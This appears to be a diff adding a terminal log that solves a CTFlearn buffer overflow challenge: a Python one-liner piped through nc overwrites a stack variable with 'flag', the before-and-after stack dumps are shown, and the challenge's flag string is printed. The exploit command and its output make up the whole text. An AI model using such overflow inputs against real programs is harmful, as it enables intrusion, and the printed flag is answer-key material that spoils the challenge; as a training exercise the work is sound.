@@ -1,0 +1,33 @@
+
+
+jnasd@jnasd-VirtualBox:~/ctflearn$ python -c "print ('a' * 48 + '\x66\x6c\x61\x67')" | nc thekidofarcrania.com 35235
+
+Legend: buff MODIFIED padding MODIFIED
+  notsecret MODIFIED secret MODIFIED CORRECT secret
+0xff8e8448 | 00 00 00 00 00 00 00 00 |
+0xff8e8450 | 00 00 00 00 00 00 00 00 |
+0xff8e8458 | 00 00 00 00 00 00 00 00 |
+0xff8e8460 | 00 00 00 00 00 00 00 00 |
+0xff8e8468 | ff ff ff ff ff ff ff ff |
+0xff8e8470 | ff ff ff ff ff ff ff ff |
+0xff8e8478 | ef be ad de 00 ff ff ff |
+0xff8e8480 | c0 05 71 f7 84 9f 61 56 |
+0xff8e8488 | 98 84 8e ff 11 7b 61 56 |
+0xff8e8490 | b0 84 8e ff 00 00 00 00 |
+
+Input some text: 
+Legend: buff MODIFIED padding MODIFIED
+  notsecret MODIFIED secret MODIFIED CORRECT secret
+0xff8e8448 | 61 61 61 61 61 61 61 61 |
+0xff8e8450 | 61 61 61 61 61 61 61 61 |
+0xff8e8458 | 61 61 61 61 61 61 61 61 |
+0xff8e8460 | 61 61 61 61 61 61 61 61 |
+0xff8e8468 | 61 61 61 61 61 61 61 61 |
+0xff8e8470 | 61 61 61 61 61 61 61 61 |
+0xff8e8478 | 66 6c 61 67 00 ff ff ff |
+0xff8e8480 | c0 05 71 f7 84 9f 61 56 |
+0xff8e8488 | 98 84 8e ff 11 7b 61 56 |
+0xff8e8490 | b0 84 8e ff 00 00 00 00 |
+
+You did it! Congratuations!
+CTFlearn{buffer_0verflows_4re_c00l!}
